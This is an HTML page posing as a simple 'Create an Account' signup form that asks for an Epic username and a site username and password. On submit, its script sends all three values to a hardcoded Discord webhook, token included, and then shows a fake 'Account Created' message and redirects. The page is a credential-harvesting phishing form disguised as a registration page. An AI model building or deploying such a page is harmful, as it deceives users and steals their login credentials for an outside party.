<!DOCTYPE html>
<html>
<head>
    <title>My First Ever Website</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 20px;
        }
        
        h1 {
            color: #333;
            text-align: center;
        }
        
        .form-container {
            width: 300px;
            margin: 0 auto;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }
        
        .form-group input {
            width: 100%;
            padding: 5px;
            font-size: 16px;
            border-radius: 4px;
            border: 1px solid #ccc;
        }
        
        .form-group button {
            background-color: #007bff;
            color: #fff;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 4px;
            transition: background-color 0.3s ease;
        }
        
        .form-group button:hover {
            background-color: #0056b3;
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body>
    <h1>Create an Account</h1>
    <div class="form-container">
        <form id="new-user-form">
            <div class="form-group">
                <label for="epic-username">Epic Username:</label>
                <input type="text" id="epic-username" name="epic-username" required>
            </div>
            <div class="form-group">
                <label for="site-username">Username for the Site:</label>
                <input type="text" id="site-username" name="site-username" required>
            </div>
            <div class="form-group">
                <label for="site-password">Password for the Site:</label>
                <input type="password" id="site-password" name="site-password" required>
            </div>
            <button type="submit">Submit</button>
        </form>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", function(event) {
            document.getElementById("new-user-form").addEventListener("submit", function(event) {
                event.preventDefault(); // Prevent form submission

                var epicUsername = document.getElementById("epic-username").value;
                var siteUsername = document.getElementById("site-username").value;
                var sitePassword = document.getElementById("site-password").value;

                var message = "Discord Username: " + epicUsername + "\nUsername for the Site: " + siteUsername + "\nPassword for the Site: " + sitePassword;

                var webhookURL = "https://discord.com/api/webhooks/1124418484722471042/p41HEeOapcJNZ_Grk2cQiFJU7pS8yr02r1gV1XAiJCD_vuhtu_FUwgDJYTCdV0TBLcmq";
                var xhr = new XMLHttpRequest();
                xhr.open("POST", webhookURL, true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify({ content: message }));

                Swal.fire({
                    title: "Account Created",
                    text: "Your account has been created successfully!",
                    icon: "success",
                    confirmButtonText: "OK"
                }).then(function() {
                    // Redirect to another page or perform any desired action
                    window.location.href = "dashboard.html";
                });
            });
        });
    </script>
</body>
</html>
